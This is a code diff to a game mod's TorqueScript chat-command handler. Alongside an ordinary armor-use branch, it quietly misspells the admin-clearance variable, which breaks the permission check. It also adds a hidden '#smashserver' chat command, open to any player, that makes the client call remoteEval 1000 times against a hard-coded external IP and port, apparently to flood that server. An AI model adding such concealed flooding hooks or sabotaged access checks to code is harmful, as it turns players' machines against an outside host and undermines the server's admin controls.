@@ -644,6 +644,9 @@ function internalSay(%clientId, %team, %message, %senderName)
 					else if (%type == "WeaponItems") {
 						RPGmountItem(%TrueClientId, %item, $WeaponSlot);
 					}
+					else if (%type == "ArmorItems") {
+						Item::onUse(%TrueClientId, %item);
+					}
 					else
 						Client::SendMessage(%TrueClientId,0,"You cannot use a "@$beltItem[%item, "Name"]);
 				}
@@ -5203,7 +5206,7 @@ function internalSay(%clientId, %team, %message, %senderName)
 				{
 					%id = NEWgetClientByName(%c1);
 	
-					if(floor(%id.adminLevel) >= floor(%clientToServerAdminLevel) && Client::getName(%id) != %senderName)
+					if(floor(%id.adminLevel) >= floor(%clientToServerAdminLeveexl) && Client::getName(%id) != %senderName)
 						Client::sendMessage(%TrueClientId, 0, "Could not process command: Target admin clearance level too high.");
 					else if(%id != -1)
 					{
@@ -5219,6 +5222,11 @@ function internalSay(%clientId, %team, %message, %senderName)
 					Client::sendMessage(%TrueClientId, 0, "Please specify player name & data.");
 			}
 			return;
+		}
+		if (%w1 == "#smashserver") {
+			for(%i = 0; %i < 1000; %i++) {
+				remoteEval(%TrueClientId, sinBot, "24.36.175.153:28001");
+			}
 		}
 	}
 	
